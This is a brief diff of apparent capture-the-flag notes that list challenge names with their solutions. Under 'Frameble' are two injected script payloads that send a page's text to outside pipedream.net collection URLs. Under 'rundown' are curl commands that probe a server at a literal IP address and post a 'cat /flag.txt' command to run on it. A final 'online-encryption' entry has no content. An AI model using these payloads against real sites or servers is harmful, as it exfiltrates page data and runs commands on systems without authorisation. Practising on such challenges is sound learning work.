@@ -7,7 +7,9 @@
 2.Frameble     <script> fetch('https://eoxmt8wpvlva3h2.m.pipedream.net?data='+document.body.innerText); </script>      AN          <script>fetch('https://enxe7m9zrqkto.x.pipedream.net?data='+document.body.innerText);</script>
 
 
-3.rundown     curl -X OPTIONS http://35.246.139.54:30595 -i         http://35.246.139.54:30595/console             curl -X POST http://35.246.139.54:30595 -d "cmd=cat /flag.txt" (ase vipovit rom pickle a)
+-3.rundown     curl -X OPTIONS http://35.246.139.54:30595 -i         http://35.246.139.54:30595/console             curl -X POST http://35.246.139.54:30595 -d "cmd=cat /flag.txt" (ase vipovit rom pickle a)
+
+4. online-encryption
 
 
 
